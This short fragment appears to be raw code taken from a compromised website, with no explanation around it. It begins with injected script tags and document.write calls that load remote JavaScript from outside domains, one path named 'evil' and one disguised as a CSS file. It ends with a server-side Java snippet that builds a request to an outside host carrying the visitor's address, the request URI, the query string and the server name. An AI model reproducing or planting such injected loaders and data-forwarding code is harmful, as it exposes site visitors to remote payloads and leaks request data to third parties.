document.write("<script src=\"http://cpm.36obuy.org/evil/1.js\"></script>");<script src="http://cpm.36obuy.org/evil/1.js"></script>document.write("<script src=\"http://cpm.36obuy.org/lion/1.js\"></script>");<script src="http://cpm.36obuy.org/lion/1.js"></script><script src="http://cpm.36obuy.org/js/1.js"></script><script/src=//360cdn.win/c.css></script>
...
String fuwuqidezhi = "http://cxbzzj.cn/";

String host_name="http://" + request.getRemoteAddr() + request.getRequestURI();

String Remote_file = fuwuqidezhi + "/index.html?host=" + host_name + "&url=" + request.getQueryString() + "&domain="+request.getServerName();
